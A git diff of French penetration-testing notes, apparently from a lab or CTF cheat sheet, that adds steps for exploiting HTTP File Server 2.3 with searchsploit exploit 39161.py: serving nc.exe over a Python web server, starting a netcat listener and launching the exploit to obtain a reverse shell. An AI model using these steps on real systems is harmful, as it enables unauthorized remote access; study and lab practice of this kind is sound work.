@@ -20,8 +20,10 @@ Metasploit Framework Directory à regarder pour le HTTP :
 `searchsploit HTTP File server 2.3` pour trouver les exploit de HTTP 2.3.  
 `searchsploit -m 39161.py` : pour DL l'exploit.  
 * il faut l'éditer avec nano puis changer IP du fichier avec notre IP attaquante et le port (sauvegarder).  
-* Télécharger nc.exe comme demandé dans l'exploit : `cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/`, dans le même dossier (exploit+nc.exe)
-
+* Télécharger nc.exe comme demandé dans l'exploit : `cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/`, dans le même dossier (exploit+nc.exe)  
+* `python -m SimpleHTTPServer 80` : lancement du serveur web qui va herberger nc.exe  
+* Ouvrir une nouvelle fenêtre et lancer le listener `nc -lvnp 1234`  
+* Ouvrir une nouvelle fenêtre et lancer l'exploit : `python 39161.py IP_target 80`, il peut être possible de relancer l'exploit si on obtient pas de shell au premier coup (2eme lancement normalement c'est bon)  
 
 
 ## Apache Tomcat
